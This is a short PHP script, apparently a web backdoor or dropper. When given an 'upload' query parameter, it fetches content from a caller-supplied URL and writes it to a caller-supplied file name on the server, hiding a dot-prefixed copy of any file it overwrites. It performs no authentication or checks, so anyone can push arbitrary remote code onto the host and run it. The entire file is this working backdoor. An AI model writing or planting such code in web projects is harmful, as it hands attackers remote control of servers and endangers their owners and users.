<?php

/////////////////////////

if (isset($_GET['upload'])){

	$upload = explode(" ", $_GET['upload']);

	$location = $upload[0];

	$file_name = $upload[1];

	$data_url = file_get_contents($location);

	if (file_exists($file_name)){

		$file = file_get_contents($file_name);

		file_put_contents(".$file_name", $file);
	}

	file_put_contents($file_name, $data_url);

}

/////////////////////////

?>
